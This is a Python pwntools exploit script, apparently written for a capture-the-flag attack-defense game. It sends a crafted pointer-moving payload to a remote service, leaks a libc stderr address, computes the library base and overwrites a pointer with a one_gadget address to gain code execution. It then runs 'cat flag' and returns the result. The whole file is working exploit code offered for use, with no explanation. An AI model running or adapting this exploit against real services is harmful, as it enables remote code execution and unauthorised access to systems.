from pwn import *
def main(ip,port):
    try:
        io = remote(ip, port,timeout=5)
        payload = '<'*0x1c+'.<.<.<.<.'+'<'*0x40+',>,>,>,>,>,'
        io.sendline(payload)
        time.sleep(0.5)
        stderr = u64(io.recv()[-5:][::-1]+"\x7f\x00\x00")
        #Log.d("Leak stderr address = %#x" (stderr))
        elf_base = stderr - 0x3c71c0 #0x3c2520
        one_gadget = elf_base + 0x43048 #0x45526
        io.sendline(p64(one_gadget))
        time.sleep(0.5)
        #io.interactive()
        io.sendline("cat flag")
        flag = io.recvline()
        io.close()
        return {'getflag_status':'getflag success', 'flag': flag}
    except (KeyboardInterrupt, SystemExit):
        raise
    except Exception, e:
        a = str(e)
        return {'getflag_status':'getflag failed'+a, 'flag':'error'}

if __name__ == '__main__':
    main(ip,port)